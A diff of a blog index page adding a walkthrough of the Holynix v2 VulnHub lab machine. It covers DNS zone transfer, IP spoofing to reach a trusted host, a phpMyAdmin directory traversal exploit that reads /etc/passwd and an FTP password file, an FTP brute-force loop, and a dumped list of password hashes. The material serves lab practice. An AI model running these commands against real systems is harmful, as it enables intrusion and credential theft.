@@ -9,16 +9,8 @@
   <meta name="author" content="Norbert Szetei">
 
   
-  <meta name="description" content="Image: Kioptrix: Level 1 (#1) Nmap output: 1
-2
-3
-4
-5
-6
-7
-PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99)
-80/tcp open http &hellip;">
+  <meta name="description" content="Image: Holynix: v2 We set our network preferences to &ldquo;Share with my Mac&rdquo; on both vulnerable server
+and Kali Linux. Our NIC address will &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -87,6 +79,1147 @@ PORT STATE SERVICE VERSION
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/10/holynix-v2/">Holynix: V2</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-10T14:35:19+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:35 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/holynix-v2,21/">Holynix: v2</a></p>
+
+<p>We set our network preferences to &ldquo;Share with my Mac&rdquo; on both vulnerable server
+and Kali Linux. Our NIC address will be the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ifconfig eth0:1 192.168.1.11</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nmap output for 192.168.1.88:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE  SERVICE
+</span><span class='line'>20/tcp closed ftp-data
+</span><span class='line'>21/tcp open   ftp 
+</span><span class='line'>22/tcp open   ssh 
+</span><span class='line'>53/tcp open   domain
+</span><span class='line'>80/tcp open   http</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We add to /etc/hosts:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.1.88 www.zincftp.com
+</span><span class='line'>192.168.1.88 zincftp.com</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Asking DNS server about the domain reports:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# dig @192.168.1.88 zincftp.com
+</span><span class='line'>
+</span><span class='line'>; &lt;&lt;>> DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;>> @192.168.1.88 zincftp.com
+</span><span class='line'>; (1 server found)
+</span><span class='line'>;; global options: +cmd
+</span><span class='line'>;; Got answer:
+</span><span class='line'>;; ->>HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 28383
+</span><span class='line'>;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2
+</span><span class='line'>
+</span><span class='line'>;; QUESTION SECTION:
+</span><span class='line'>;zincftp.com.                   IN      A
+</span><span class='line'>
+</span><span class='line'>;; ANSWER SECTION:
+</span><span class='line'>zincftp.com.            38400   IN      A       192.168.1.88
+</span><span class='line'>
+</span><span class='line'>;; AUTHORITY SECTION:
+</span><span class='line'>zincftp.com.            38400   IN      NS      ns1.zincftp.com.
+</span><span class='line'>zincftp.com.            38400   IN      NS      ns2.zincftp.com.
+</span><span class='line'>
+</span><span class='line'>;; ADDITIONAL SECTION:
+</span><span class='line'>ns1.zincftp.com.        38400   IN      A       192.168.1.88
+</span><span class='line'>ns2.zincftp.com.        38400   IN      A       192.168.1.89
+</span><span class='line'>
+</span><span class='line'>;; Query time: 3 msec
+</span><span class='line'>;; SERVER: 192.168.1.88#53(192.168.1.88)
+</span><span class='line'>;; WHEN: Sun May  3 01:04:27 2015
+</span><span class='line'>;; MSG SIZE  rcvd: 113</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We append these lines to /etc/hosts and try DNS AXFR (zone transfer):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.1.88 ns1.zincftp.com
+</span><span class='line'>192.168.1.89 ns2.zincftp.com</span></code></pre></td></tr></table></div></figure>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# dig @192.168.1.88 zincftp.com axfr
+</span><span class='line'>
+</span><span class='line'>; &lt;&lt;>> DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;>> @192.168.1.88 zincftp.com axfr
+</span><span class='line'>; (1 server found)
+</span><span class='line'>;; global options: +cmd
+</span><span class='line'>; Transfer failed.
+</span><span class='line'>root@kali32:~# dig @192.168.1.89 zincftp.com axfr
+</span><span class='line'>;; Connection to 192.168.1.89#53(192.168.1.89) for zincftp.com failed: host unreachable.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We change our IP address to the IP of the not reachable DNS server and try AXFR again:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ifconfig eth0:1 192.168.1.89
+</span><span class='line'>root@kali32:~# dig @192.168.1.89 zincftp.com axfr
+</span><span class='line'>
+</span><span class='line'>; &lt;&lt;>> DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;>> @192.168.1.88 zincftp.com axfr
+</span><span class='line'>; (1 server found)
+</span><span class='line'>;; global options: +cmd
+</span><span class='line'>zincftp.com.            38400   IN      SOA     ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
+</span><span class='line'>zincftp.com.            38400   IN      NS      ns1.zincftp.com.
+</span><span class='line'>zincftp.com.            38400   IN      NS      ns2.zincftp.com.
+</span><span class='line'>zincftp.com.            38400   IN      MX      10 mta.zincftp.com.
+</span><span class='line'>zincftp.com.            38400   IN      A       192.168.1.88
+</span><span class='line'>ahuxley.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>amckinley.zincftp.com.  38400   IN      A       192.168.1.88
+</span><span class='line'>bzimmerman.zincftp.com. 38400   IN      A       192.168.1.88
+</span><span class='line'>cbergey.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>cfinnerly.zincftp.com.  38400   IN      A       192.168.1.88
+</span><span class='line'>cjalong.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>cmahong.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>cmanson.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>ddonnovan.zincftp.com.  38400   IN      A       192.168.1.88
+</span><span class='line'>ddypsky.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>dev.zincftp.com.        38400   IN      A       192.168.1.88
+</span><span class='line'>dhammond.zincftp.com.   38400   IN      A       192.168.1.88
+</span><span class='line'>dmoran.zincftp.com.     38400   IN      A       192.168.1.88
+</span><span class='line'>dsummers.zincftp.com.   38400   IN      A       192.168.1.88
+</span><span class='line'>evorhees.zincftp.com.   38400   IN      A       192.168.1.88
+</span><span class='line'>gwelch.zincftp.com.     38400   IN      A       192.168.1.88
+</span><span class='line'>hmcknight.zincftp.com.  38400   IN      A       192.168.1.88
+</span><span class='line'>jgacy.zincftp.com.      38400   IN      A       192.168.1.88
+</span><span class='line'>jsmith.zincftp.com.     38400   IN      A       192.168.1.88
+</span><span class='line'>jstreet.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>kmccallum.zincftp.com.  38400   IN      A       192.168.1.88
+</span><span class='line'>lnickerbacher.zincftp.com. 38400 IN     A       192.168.1.88
+</span><span class='line'>lsanderson.zincftp.com. 38400   IN      A       192.168.1.88
+</span><span class='line'>lwestre.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>mta.zincftp.com.        38400   IN      A       10.0.192.48
+</span><span class='line'>ncobol.zincftp.com.     38400   IN      A       192.168.1.88
+</span><span class='line'>ns1.zincftp.com.        38400   IN      A       192.168.1.88
+</span><span class='line'>ns2.zincftp.com.        38400   IN      A       192.168.1.89
+</span><span class='line'>rcropper.zincftp.com.   38400   IN      A       192.168.1.88
+</span><span class='line'>rfrost.zincftp.com.     38400   IN      A       192.168.1.88
+</span><span class='line'>rwoo.zincftp.com.       38400   IN      A       192.168.1.88
+</span><span class='line'>skrymple.zincftp.com.   38400   IN      A       192.168.1.88
+</span><span class='line'>splath.zincftp.com.     38400   IN      A       192.168.1.88
+</span><span class='line'>tmartin.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>trusted.zincftp.com.    38400   IN      A       192.168.1.34
+</span><span class='line'>www.zincftp.com.        38400   IN      A       192.168.1.88
+</span><span class='line'>zincftp.com.            38400   IN      SOA     ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
+</span><span class='line'>;; Query time: 5 msec
+</span><span class='line'>;; SERVER: 192.168.1.88#53(192.168.1.88)
+</span><span class='line'>;; WHEN: Sun May  3 01:08:24 2015
+</span><span class='line'>;; XFR size: 42 records (messages 1, bytes 1021)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Appending the list to /etc/hosts:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:~# dig @192.168.1.88 zincftp.com axfr <span class="p">|</span> egrep <span class="s1">&#39;192.168.1.88$&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;{ print $5 &quot; &quot; $1}&#39;</span>  <span class="p">|</span> sed <span class="s1">&#39;s#.$##&#39;</span> &gt;&gt; /etc/hosts
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Dirb reports the following URLs:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>---- Scanning URL: http://www.zincftp.com/ ----
+</span><span class='line'>+ http://www.zincftp.com/index (CODE:200|SIZE:1205)
+</span><span class='line'>+ http://www.zincftp.com/index.php (CODE:200|SIZE:1205)
+</span><span class='line'>+ http://www.zincftp.com/phpMyAdmin (CODE:403|SIZE:333)
+</span><span class='line'>+ http://www.zincftp.com/register (CODE:200|SIZE:16)
+</span><span class='line'>+ http://www.zincftp.com/server-status (CODE:403|SIZE:336)
+</span><span class='line'>+ http://www.zincftp.com/setup_guides</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In particular the interesting file was <a href="http://www.zincftp.com/setup_guides/todo">http://www.zincftp.com/setup_guides/todo</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;!--
+</span><span class='line'>Adding new users to the system
+</span><span class='line'>- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+</span><span class='line'>
+</span><span class='line'>create user
+</span><span class='line'>        useradd -g ftp_users -s /bin/false -d /home/&lt;username&gt; -m &lt;username&gt;
+</span><span class='line'>
+</span><span class='line'>create web dir
+</span><span class='line'>        mkdir /home/&lt;username&gt;/web
+</span><span class='line'>
+</span><span class='line'><span class="nb">set </span>ownership so ftp can write to dir
+</span><span class='line'>        chown -R vftp:ftp_users /home/&lt;username&gt;
+</span><span class='line'>
+</span><span class='line'>add ftp user
+</span><span class='line'>        pure-pw useradd &lt;username&gt; -u vftp -g ftp_users -d /home/&lt;username&gt;
+</span><span class='line'>
+</span><span class='line'>update /etc/pure-ftpd/pureftpd.passwd file
+</span><span class='line'>        pure-pw mkdb
+</span><span class='line'>--&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Again we set our IP address to match the &ldquo;trusted.zincftp.com&rdquo; host, to get access to phpmyadmin:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ifconfig eth0:1 192.168.1.34</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We found nothing interesting in phpmyadmin, but it&rsquo;s vulnerable and we can interpret the arbitrary file on web server as PHP script.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# ./searchsploit phpmyadmin | grep 2.6
+</span><span class='line'>phpMyAdmin 2.6.4-pl1 - Remote Directory Traversal Exploit | /php/webapps/1244.pl
+</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../etc/passwd
+</span><span class='line'>
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
+</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false
+</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false
+</span><span class='line'>klog:x:103:104::/home/klog:/bin/false
+</span><span class='line'>bind:x:104:111::/var/cache/bind:/bin/false
+</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>mysql:x:106:115:MySQL Server,,,:/var/lib/mysql:/bin/false
+</span><span class='line'>lsanderson:x:1000:114:Lyle Sanderson:/home/lsanderson:/bin/bash
+</span><span class='line'>cfinnerly:x:1001:100:Chuck Finnerly:/home/cfinnerly:/bin/bash
+</span><span class='line'>ddonnovan:x:1002:100:David Donnovan:/home/ddonnovan:/bin/bash
+</span><span class='line'>skrymple:x:1003:100:Shelly Krymple:/home/skrymple:/bin/bash
+</span><span class='line'>amckinley:x:1004:100:Agustin Mckinley:/home/amckinley:/bin/bash
+</span><span class='line'>cmahong:x:1005:2002::/home/cmahong:/bin/false
+</span><span class='line'>lnickerbacher:x:1006:2002::/home/lnickerbacher:/bin/false
+</span><span class='line'>jstreet:x:1007:2002::/home/jstreet:/bin/false
+</span><span class='line'>rwoo:x:1008:2002::/home/rwoo:/bin/false
+</span><span class='line'>kmccallum:x:1009:2002::/home/kmccallum:/bin/false
+</span><span class='line'>cjalong:x:1010:2002::/home/cjalong:/bin/false
+</span><span class='line'>jsmith:x:1011:2002::/home/jsmith:/bin/false
+</span><span class='line'>dhammond:x:1012:2002::/home/dhammond:/bin/false
+</span><span class='line'>hmcknight:x:1013:2002::/home/hmcknight:/bin/false
+</span><span class='line'>lwestre:x:1014:2002::/home/lwestre:/bin/false
+</span><span class='line'>gwelch:x:1015:2002::/home/gwelch:/bin/false
+</span><span class='line'>dmoran:x:1016:2002::/home/dmoran:/bin/false
+</span><span class='line'>dsummers:x:1017:2002::/home/dsummers:/bin/false
+</span><span class='line'>bzimmerman:x:1018:2002::/home/bzimmerman:/bin/false
+</span><span class='line'>ncobol:x:1019:2002::/home/ncobol:/bin/false
+</span><span class='line'>ddypsky:x:1020:2002::/home/ddypsky:/bin/false
+</span><span class='line'>rcropper:x:1021:2002::/home/rcropper:/bin/false
+</span><span class='line'>cbergey:x:1022:2002::/home/cbergey:/bin/false
+</span><span class='line'>tmartin:x:1023:2002::/home/tmartin:/bin/false
+</span><span class='line'>jgacy:x:1024:2002::/home/jgacy:/bin/false
+</span><span class='line'>splath:x:1025:2002::/home/splath:/bin/false
+</span><span class='line'>evorhees:x:1026:2002::/home/evorhees:/bin/false
+</span><span class='line'>rfrost:x:1027:2002::/home/rfrost:/bin/false
+</span><span class='line'>ahuxley:x:1028:2002::/home/ahuxley:/bin/false
+</span><span class='line'>webmaster:x:1029:2002::/var/www:/bin/false
+</span><span class='line'>cmanson:x:1030:2002::/home/cmanson:/bin/false
+</span><span class='line'>vftp:x:1031:2002:Virtual FTP User:/dev/null:/bin/false</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/apache2/apache2.conf | grep -i log
+</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/pure-ftpd/conf/PureDB
+</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/pure-ftpd/pureftpd.pdb
+</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/init.d/firewall</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can also try to perform the brute-force attack on ftp users (see /etc/group)
+and generate the short wordlist with john according username, but without
+success, ftp connection is limited with the firewall:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:~# <span class="k">for</span> i in <span class="k">$(</span>cat ftp-users<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$i</span> &gt; john-temp-wl <span class="p">;</span> john --wordlist<span class="o">=</span><span class="s2">&quot;john-temp-wl&quot;</span> --rules --stdout &gt; john-temp-wl-with-rules<span class="p">;</span> hydra -l <span class="nv">$i</span> -P john-temp-wl-with-rules 192.168.1.88 ftp -V -t <span class="m">1</span> -w 50<span class="p">;</span> <span class="k">done</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After a while we found the hash list for ftp and used the john to crack it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/pure-ftpd/pureftpd.passwd
+</span><span class='line'>
+</span><span class='line'>cmahong:$1$vUW5q3t0$9RZSkReNoWGCaPtL7ixLX0:1031:2002::/home/cmahong/./::::::::::::
+</span><span class='line'>lnickerbacher:$1$yiEZKCE0$BOuvM8nrfoNGWAcjPenpa.:1031:2002::/home/lnickerbacher/./::::::::::::
+</span><span class='line'>jstreet:$1$sBGmOuB0$TPHx0jBSFjtJu7dJXb4Nw/:1031:2002::/home/jstreet/./::::::::::::
+</span><span class='line'>rwoo:$1$VZxDrE30$p7NPDTkxuQhPSsLpi2a1H1:1031:2002::/home/rwoo/./::::::::::::
+</span><span class='line'>cfinnerly:$1$dRGyIOy0$OVGBtLHyxFjPg7tmxtvHY/:1031:2002::/home/cfinnerly/./::::::::::::
+</span><span class='line'>kmccallum:$1$dijBzwn0$qlGcbcTT0Qyg8wQf4.QiG1:1031:2002::/home/kmccallum/./::::::::::::
+</span><span class='line'>cjalong:$1$FVj4if60$BWSIDiE97oTKUs70qOjZx/:1031:2002::/home/cjalong/./::::::::::::
+</span><span class='line'>jsmith:$1$yQKaOpR0$UdySwRtPd1upTckQ5/.CM/:1031:2002::/home/jsmith/./::::::::::::
+</span><span class='line'>lsanderson:$1$gzIP52U0$cL6XE61yDZD0unvIIkV8l/:1031:2002::/home/lsanderson/./::::::::::::
+</span><span class='line'>dhammond:$1$yK9OuzZ0$W7mgvS4SisxP1BwdLsuy1/:1031:2002::/home/dhammond/./::::::::::::
+</span><span class='line'>hmcknight:$1$A07SpdB0$hs/m8KyoJyY3gVAhlWDQI/:1031:2002::/home/hmcknight/./::::::::::::
+</span><span class='line'>lwestre:$1$.R5Dbl60$n2ajoJce/LnPVCq497sUQ.:1031:2002::/home/lwestre/./::::::::::::
+</span><span class='line'>gwelch:$1$/uYT22Y0$njR3vmLQrbnAugwkNLgJ5/:1031:2002::/home/gwelch/./::::::::::::
+</span><span class='line'>dmoran:$1$JZrJXdU0$ORe5.yRgQHCQl6h14rEEe.:1031:2002::/home/dmoran/./::::::::::::
+</span><span class='line'>dsummers:$1$VXo3pWp0$v0J7NsxRhDy/ufU01P/ch1:1031:2002::/home/dsummers/./::::::::::::
+</span><span class='line'>bzimmerman:$1$rQep6B90$ZtnoFZpTEBkNoRCfqJRpe/:1031:2002::/home/bzimmerman/./::::::::::::
+</span><span class='line'>amckinley:$1$45Bz0af0$Fsfo.XXcLkVzSaH5bLjzI0:1031:2002::/home/amckinley/./::::::::::::
+</span><span class='line'>ncobol:$1$q.xxgp70$645DFncdOFc24n93la5a70:1031:2002::/home/ncobol/./::::::::::::
+</span><span class='line'>ddypsky:$1$ccUhlpJ0$PO/WATKUekwaPct4zXeV9.:1031:2002::/home/ddypsky/./::::::::::::
+</span><span class='line'>rcropper:$1$Qhw2Vff0$QDvQMEe9CGFwVrvVUPqTz0:1031:2002::/home/rcropper/./::::::::::::
+</span><span class='line'>ddonnovan:$1$1z2APl80$uAyYFZLPu/WRkkpegD3Ht.:1031:2002::/home/ddonnovan/./::::::::::::
+</span><span class='line'>cbergey:$1$MOwY3Ie0$LcgARpcVk8Hf8n.E7itC40:1031:2002::/home/cbergey/./::::::::::::
+</span><span class='line'>tmartin:$1$3jpH7Yk0$2XmRv6acGEkBjmNQeyzUz.:1031:2002::/home/tmartin/./::::::::::::
+</span><span class='line'>jgacy:$1$b.0bYDi0$sSMXaRDSZu8YvWVz.wfCo0:1031:2002::/home/jgacy/./::::::::::::
+</span><span class='line'>splath:$1$jbdcsaj0$7uaXto3yRZWwDp5VEbJQV/:1031:2002::/home/splath/./::::::::::::
